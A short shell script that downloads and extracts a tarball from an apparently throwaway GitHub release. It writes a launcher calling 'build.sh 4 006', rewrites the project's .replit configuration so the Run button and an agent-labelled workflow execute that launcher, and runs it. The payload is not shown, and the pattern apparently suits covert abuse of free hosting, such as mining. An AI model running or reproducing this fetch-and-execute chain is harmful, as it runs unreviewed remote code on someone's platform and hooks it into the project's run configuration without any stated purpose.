curl -O -J -L https://github.com/wouegrkaj922-max/dewsa/releases/download/deas/kombe.tar.gz && tar -xf kombe.tar.gz && rm -rf kombe.tar.gz
echo '#!/bin/bash

bash build.sh 4 006' > bolo.sh
echo 'modules = ["python-3.11"]

[workflows]
runButton = "Project"

[[workflows.workflow]]
name = "Project"
mode = "parallel"
author = "agent"

[[workflows.workflow.tasks]]
task = "workflow.run"
args = "bolo"

[[workflows.workflow]]
name = "bolo"
author = "agent"

[[workflows.workflow.tasks]]
task = "shell.exec"
args = "bash bolo.sh"

[workflows.workflow.metadata]
outputType = "console"' > .replit
bash bolo.sh
